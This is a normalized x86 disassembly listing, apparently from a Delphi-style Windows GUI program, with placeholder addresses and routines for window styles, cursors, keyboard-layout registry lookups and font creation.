cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_451258
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451258
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_437f84
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_4512c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_451258
pop ecx
mov eax [ esi + 0x34 ]
call sub_4465f4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_446604
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45134c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4395e0
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_4032f4
sub_451370
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_4032f4
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4513a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451370
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4513a0
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_437f84
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45141c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_451370
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_451370
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4513a0
pop ecx
test al al
je r-xdata
sub_451470
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_4032f4
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4514a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451470
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4514a0
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_437f84
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45151c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_451470
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_451470
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4514a0
pop ecx
test al al
je r-xdata
sub_451570
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4139f4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_440cdc
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4515c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_451570
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_4032f4
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451640
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41a46c
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45167c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_434f74
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_435c5c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4516c4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_43b290
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_43b290
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_43b290
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_43b290
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_43b290
push eax
call RedrawWindow
sub_451818
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_44c5c8
mov dl 0x5
mov eax ebx
call sub_44e33c
mov dl 0x1
mov eax ebx
call sub_439e6c
mov dl 0x3
mov eax ebx
call sub_44e638
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_451880
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_451957
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_439d2c
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_439b98
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_433fa4
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_434a04
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403fa4
mov eax [ ebp - 0xc ]
call sub_404174
push eax
mov eax [ ebp - 0xc ]
call sub_404374
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_434a14
mov eax [ ebp - 0xc ]
call sub_404174
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45195e
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
mov dl 0x1
mov eax esi
call sub_44d9bc
mov edx [ ebp - 0xc ]
mov eax esi
call sub_434ac0
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404500
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_451984
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_437fc0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_44d0e0
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_437f84
mov edx ebx
pop ecx
mov si 0xffcc
call sub_4032f4
inc ebp
dec edi
jne r-xdata
sub_4519d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_439d2c
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4519fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a534
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_451a24
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44fd8c
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b290
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_439d2c
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b290
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43b290
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_439d40
or ecx 0xffffffff
mov dl 0x1
call sub_435150
pop esi
pop ebx
retn
sub_451abc
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43a9a4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_435c5c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_434430
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_4032f4
sub_451b14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_451bda
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_434a04
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403fa4
mov eax [ ebp - 0x4 ]
call sub_404174
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_434a14
mov eax [ ebp - 0x4 ]
call sub_404174
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_434ac0
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451be1
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_44d9bc
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404500
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_451c00
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43a724
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_439d2c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_439d40
mov dl [ ebx + 0x57 ]
call sub_4349b0
inc edi
dec esi
jne r-xdata
sub_451ca4
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_451cd4
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_451d04
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419cdc
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4520a8
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4520b4
mov eax ebx
call sub_4520c0
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_44e4dc
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_4524e0
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4523bc
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4523bc
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4523bc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_451e5c
push ebx
push esi
push edi
push ebp
call sub_40346c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_4030f8
mov eax [ ebp + 0x88 ]
call sub_4030f8
mov eax [ ebp + 0x84 ]
call sub_4030f8
mov eax [ ebp + 0x54 ]
call sub_4030f8
mov eax [ ebp + 0x50 ]
call sub_4030f8
mov eax [ ebp + 0x4c ]
call sub_4030f8
mov eax [ ebp + 0x30 ]
call sub_4030f8
mov eax [ ebp + 0x34 ]
call sub_4030f8
mov eax [ ebp + 0x7c ]
call sub_4030f8
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_4030f8
mov eax ebp
call sub_45211c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419d28
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403454
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4139f4
call sub_4030f8
inc edi
dec esi
jne r-xdata
sub_451fd4
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_452020
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413898
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413898
mov eax [ rw-data ]
call sub_454dac
sub_452058
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413b90
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413b90
mov eax [ rw-data ]
call sub_454dac
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_43c848
sub_4520c0
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_452178
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45211c
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026ec
mov ebx esi
test ebx ebx
jne r-xdata
sub_452178
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_4521a0
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45234b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452352
lea eax [ ebp - 0x260 ]
call sub_403eb4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403eb4
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_4159c4
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408a2c
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_43ffac
test al al
je r-xdata
xor eax eax
push ebp
push sub_452307
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404124
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404124
sub_4523bc
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_454c1c
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4549d0
mov dl 0x1
mov eax [ rw-data ]
call sub_4549d0
sub_452428
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_452450
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_452428
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_4067b4
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_40673c
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4524e0
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_452625
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4549d0
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cee4
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cee4
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41cfc8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cee4
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41cee4
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cee4
jmp r-xdata
